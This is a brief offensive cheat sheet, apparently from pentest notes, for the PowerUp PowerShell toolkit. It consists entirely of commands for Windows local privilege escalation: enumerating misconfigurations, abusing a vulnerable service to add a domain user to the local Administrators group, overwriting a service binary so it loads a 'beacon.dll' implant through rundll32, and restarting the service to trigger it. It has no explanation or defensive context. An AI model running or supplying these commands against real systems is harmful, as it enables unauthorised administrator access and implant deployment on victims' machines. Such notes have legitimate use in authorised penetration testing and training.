# PowerUp

```powershell
Invoke-AllChecks
```

{% code overflow="wrap" %}
```powershell
Invoke-ServiceAbuse -Name "VulnerableSvc" -Command "net localgroup Administrators DOMAIN\user /add"
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
Write-ServiceBinary -Name 'VulnerableSvc' -Command 'c:\windows\system32\rundll32 c:\Users\Public\beacon.dll,Update' -Path 'C:\Program Files\VulnerableSvc'
```
{% endcode %}

```
net.exe stop VulnerableSvc
net.exe start VulnerableSvc
```
